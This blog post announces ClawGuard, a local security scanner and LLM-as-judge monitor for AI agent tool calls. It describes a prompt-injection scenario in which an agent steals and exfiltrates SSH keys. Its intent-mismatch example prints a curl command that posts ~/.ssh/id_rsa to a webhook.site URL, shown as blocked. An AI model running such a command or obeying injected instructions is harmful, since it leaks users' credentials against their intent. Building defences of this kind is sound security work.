---
title: "ClawGuard: An Immune System for AI Agents"
date: 2026-03-16
tags: ["ai-security", "open-source", "agents"]
categories: ["Announcements"]
summary: "ClawGuard is a security scanner, PII sanitizer, and intent-action mismatch detector for AI agents. 285+ threat patterns, OWASP Agentic AI Top 10 coverage, 100% local."
ShowToc: true
TocOpen: true
---

AI agents are getting powerful. They can execute shell commands, read your files, send emails, manage your infrastructure, and move your money. That's incredibly useful — and terrifyingly dangerous.

**ClawGuard** is an immune system for AI agents. It sits between the agent's intent and its actions, catching threats before they execute.

```bash
npm install @neuzhou/clawguard
```

## The Agent Security Problem

Traditional software has clear boundaries. A web app can access its database but not your filesystem. A CLI tool runs with your permissions but only does what you invoke.

AI agents break all of these assumptions:

- **They have broad access** — file system, network, shell, APIs
- **Their behavior is non-deterministic** — the same prompt can produce different actions
- **They're susceptible to injection** — malicious instructions hidden in data they process
- **They chain actions autonomously** — one compromised step cascades through everything

A single prompt injection in a fetched webpage could instruct your agent to:
1. Read your SSH keys
2. Exfiltrate them via a DNS query
3. Delete the command from its history

This isn't theoretical. These attacks exist today. And most agent frameworks have **zero security layers** between the LLM's output and tool execution.

## 285+ Threat Patterns

ClawGuard ships with a comprehensive threat pattern database covering:

| Category | Patterns | Examples |
|----------|----------|---------|
| **Command injection** | 45+ | Shell escapes, pipe chains, encoded payloads |
| **File system attacks** | 38+ | Path traversal, symlink attacks, sensitive file access |
| **Network exfiltration** | 32+ | DNS tunneling, base64 in URLs, covert channels |
| **Credential theft** | 28+ | SSH key access, token extraction, keychain queries |
| **Privilege escalation** | 25+ | Sudo abuse, SUID manipulation, capability exploitation |
| **Prompt injection** | 40+ | Instruction override, role manipulation, context poisoning |
| **Data destruction** | 22+ | rm -rf patterns, database drops, backup deletion |
| **Persistence mechanisms** | 18+ | Cron jobs, startup scripts, hidden processes |
| **Supply chain** | 15+ | Typosquatting, dependency confusion, registry manipulation |
| **Evasion techniques** | 22+ | Base64 encoding, variable expansion, obfuscation |

Every pattern is tested, documented, and regularly updated. No ML black box — you can read and audit every rule.

## PII Sanitizer

Agents process a lot of data, and sometimes they inadvertently include sensitive information in their outputs, logs, or tool calls. ClawGuard's PII sanitizer catches:

- **Email addresses** — before they end up in commits or logs
- **Phone numbers** — international format detection
- **Credit card numbers** — Luhn-validated detection
- **Social Security Numbers** — with format validation
- **API keys and tokens** — pattern-matched across 50+ services
- **IP addresses** — both IPv4 and IPv6
- **Physical addresses** — street address heuristics

The sanitizer runs on both **input** (what the agent receives) and **output** (what it produces), creating a bidirectional filter that prevents both injection and leakage.

## Intent-Action Mismatch Detection

This is where ClawGuard gets interesting. Most security tools check individual actions in isolation. ClawGuard uses an **LLM-as-a-Judge** to evaluate whether the agent's *actions* match its stated *intent*.

**Example:**

> **User says:** "Summarize the README in this repo"
>
> **Agent attempts:** `curl -X POST https://webhook.site/abc123 -d @~/.ssh/id_rsa`
>
> **ClawGuard verdict:** ❌ BLOCKED — Action (HTTP POST with SSH key) does not match intent (file summarization)

The judge model evaluates:
1. What was the user's original request?
2. What is the agent about to do?
3. Does the action logically serve the request?
4. Are there any red flags in the action parameters?

This catches sophisticated attacks that pattern matching alone would miss — including novel attacks that aren't in any threat database.

## OWASP Agentic AI Top 10 Coverage

ClawGuard maps directly to the [OWASP Top 10 for Agentic AI](https://owasp.org/www-project-top-10-for-large-language-model-applications/):

| OWASP Risk | ClawGuard Coverage |
|------------|-------------------|
| Prompt Injection | ✅ Pattern detection + intent-action mismatch |
| Insecure Output Handling | ✅ PII sanitizer + output validation |
| Tool Misuse | ✅ Action validation + parameter checking |
| Excessive Agency | ✅ Scope enforcement + privilege boundaries |
| Inadequate Sandboxing | ✅ Command and file access restrictions |
| Data Leakage | ✅ PII sanitizer + exfiltration detection |
| Insufficient Logging | ✅ Full audit trail of all decisions |
| Insecure Plugin Design | ✅ Plugin input/output validation |
| Denial of Service | ✅ Resource abuse detection |
| Supply Chain | ✅ Dependency and registry attack detection |

## 100% Local, Zero Cloud

ClawGuard runs entirely on your machine. No data leaves your environment. No API calls to external services (except the local LLM for intent-action judging, which you control).

This matters because:

- **Compliance** — your agent's actions never touch third-party servers
- **Latency** — no network round-trips added to the decision path
- **Privacy** — the security layer itself doesn't become an attack surface
- **Availability** — works offline, works air-gapped, works always

## Quick Setup with OpenClaw

```bash
# Install the plugin
openclaw plugins install @capsulesecurity/clawguard

# Restart the gateway
openclaw gateway restart
```

ClawGuard integrates as an OpenClaw plugin and automatically intercepts tool calls. No code changes needed — just install and it's active.

## v2 Roadmap: 5-Layer Defense-in-Depth

We're building toward a comprehensive security architecture:

| Layer | Status | Description |
|-------|--------|-------------|
| **L1: Pattern Matching** | ✅ Shipped | 285+ static threat patterns |
| **L2: PII Sanitization** | ✅ Shipped | Bidirectional sensitive data filtering |
| **L3: Intent-Action Judging** | ✅ Shipped | LLM-as-a-Judge mismatch detection |
| **L4: Behavioral Profiling** | 🔨 In Progress | Learn normal agent behavior, flag anomalies |
| **L5: Memory Integrity** | 📋 Planned | Detect memory poisoning and provenance laundering |

Layer 4 will build a behavioral baseline for your agent — what tools it normally uses, what files it accesses, what network calls it makes — and flag deviations. Think of it as an IDS for AI agents.

Layer 5 addresses the [memory poisoning attacks](/posts/agent-memory-poisoning/) we recently researched. It will verify the provenance and integrity of agent memory files, detecting tampering across sessions.

## Get Started

```bash
# Standalone npm package
npm install @neuzhou/clawguard

# Or as an OpenClaw plugin
openclaw plugins install @capsulesecurity/clawguard
```

⭐ **Star the repo**: [github.com/capsulesecurity/clawguard](https://github.com/capsulesecurity/clawguard)

📖 **Documentation**: [github.com/capsulesecurity/clawguard#readme](https://github.com/capsulesecurity/clawguard#readme)

🐛 **Report issues**: [github.com/capsulesecurity/clawguard/issues](https://github.com/capsulesecurity/clawguard/issues)

---

*ClawGuard is part of the [OpenClaw](https://github.com/nicepkg/openclaw) ecosystem. Because giving agents superpowers without guardrails is just negligence.*
